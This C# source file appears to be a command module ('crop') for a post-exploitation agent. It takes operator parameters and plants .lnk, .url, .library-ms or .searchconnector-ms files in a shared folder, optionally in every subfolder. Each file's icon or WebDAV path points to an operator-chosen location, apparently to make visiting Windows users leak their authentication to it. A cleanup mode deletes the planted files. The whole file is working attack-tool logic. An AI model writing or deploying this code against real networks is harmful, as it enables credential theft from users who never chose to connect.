using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "crop";
        private IServiceConfig config { get; set; }
        public static IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private ICredentialProvider tokenManager { get; set; }

        public Plugin(PluginContext context)
        {
            Plugin.messageManager = context.MessageManager;
            this.config = context.Config;
            this.logger = context.Logger;
            this.tokenManager = context.TokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            //Todo update this to serialize a config object
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            var recurse = bool.Parse(args["recurse"]);
            var clean = bool.Parse(args["clean"]);


            Config.targetLocation = args["targetLocation"].ToString();
            Config.targetFilename = args["targetFilename"].ToString();
            Config.targetPath = args["targetPath"].ToString();


            if (!Config.targetLocation.EndsWith("\\"))
                Config.targetLocation = Config.targetLocation + "\\";

            if (Config.targetFilename.EndsWith(".lnk"))
            {
                DebugLog.Log($"{Name} processing LNK file [{job.task.id}]");
                if (!args.ContainsKey("targetIcon") || string.IsNullOrEmpty(args["targetIcon"].ToString()))
                {
                    messageManager.Write("No Target Icon specified" + Environment.NewLine, job.task.id, true, "error");
                    return;
                }

                Config.targetIcon = args["targetIcon"].ToString().Trim();

                messageManager.WriteLine("[*] Setting LNK value: " + Config.targetIcon, job.task.id, false);
                messageManager.WriteLine("[*] Icon location: " + Config.targetPath, job.task.id, false);

                try
                {
                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            messageManager.WriteLine("[*] Writing LNK to: " + output, job.task.id, false);
                            CropHelper.CreateLNKCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                messageManager.WriteLine("[*] Removing file: " + f + Config.targetFilename, job.task.id, false);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        messageManager.WriteLine("[*] Writing LNK to: " + output, job.task.id, false);
                        CropHelper.CreateLNKCrop(output);
                    }
                }
                catch (Exception e)
                {
                    messageManager.WriteLine(e.ToString(), job.task.id, true, "error");
                }
            }
            else if (Config.targetFilename.ToLower().EndsWith(".url") || Config.targetFilename.ToLower().EndsWith(".library-ms") || Config.targetFilename.ToLower().EndsWith(".searchconnector-ms"))
            {
                DebugLog.Log($"{Name} processing WebDAV file [{job.task.id}]");
                messageManager.WriteLine("[*] Setting WebDAV value: " + Config.targetPath, job.task.id, false);
                try
                {

                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            messageManager.WriteLine("[*] Writing file to: " + output, job.task.id, false);
                            CropHelper.CreateFileCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                messageManager.WriteLine("[*] Removing file: " + Config.targetFilename, job.task.id, false);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        messageManager.WriteLine("[*] Writing file to: " + output, job.task.id, false);
                        CropHelper.CreateFileCrop(output);
                    }
                }
                catch (Exception e)
                {
                    messageManager.WriteLine(e.ToString(), job.task.id, true, "error");
                    return;
                }
            }
            else
            {
                DebugLog.Log($"{Name} invalid file type: {Config.targetFilename} [{job.task.id}]");
                messageManager.WriteLine("[!] Not a valid file: " + Config.targetFilename, job.task.id, true, "error");
                return;
            }
            DebugLog.Log($"{Name} completed [{job.task.id}]");
            messageManager.WriteLine("[*] Done.", job.task.id, true);
        }
    }
}
